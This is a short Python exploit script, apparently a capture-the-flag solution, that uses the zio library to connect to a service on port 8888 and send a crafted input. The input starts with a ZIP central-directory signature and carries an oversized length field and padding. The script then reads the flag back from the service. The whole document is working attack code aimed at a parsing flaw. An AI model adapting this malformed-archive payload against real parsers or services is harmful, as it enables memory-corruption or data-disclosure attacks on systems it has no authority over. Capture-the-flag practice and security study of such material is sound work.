from zio import *
target  = ('0', 8888)
io      = zio(target, print_read = False, print_write = False, timeout = 10000)

payload  = 'PK\x01\x02'
payload += 'A' * 24
payload += l32(0xffff)
payload += 'B' * 14 
payload  = payload.ljust(200, 'C')
io.writeline(payload)
io.read_until('f')
flag = 'f' + io.read_until('}')
io.read_line()

print flag
